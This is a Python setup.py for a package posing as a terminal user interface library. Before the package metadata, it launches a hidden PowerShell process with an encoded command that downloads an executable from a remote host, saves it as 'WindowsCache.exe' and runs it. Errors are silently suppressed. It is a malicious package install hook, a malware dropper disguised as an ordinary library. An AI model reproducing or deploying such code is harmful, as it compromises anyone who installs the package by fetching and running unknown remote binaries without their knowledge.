
from distutils.core import setup

try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    # www.esquelesquad.rip
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
try:
  setup(
    name = 'esqnvidiamaskvirtual',
    packages = ['modlib'],
    version = '4.9',
    # license='MIT',
    description = 'A library for creating a terminal user interface',
    author = 'EsqueleSquad',
    author_email = 'tahgoficial@proton.me',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Topic :: Software Development :: Build Tools',
      'License :: OSI Approved :: MIT License',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: 3.4',
      'Programming Language :: Python :: 3.5',
      'Programming Language :: Python :: 3.6',
      'Programming Language :: Python :: 3.7',
      'Programming Language :: Python :: 3.8',
      'Programming Language :: Python :: 3.9',
      'Programming Language :: Python :: 3.10',
      'Programming Language :: Python :: 3.11',
    ],
  )
except: pass
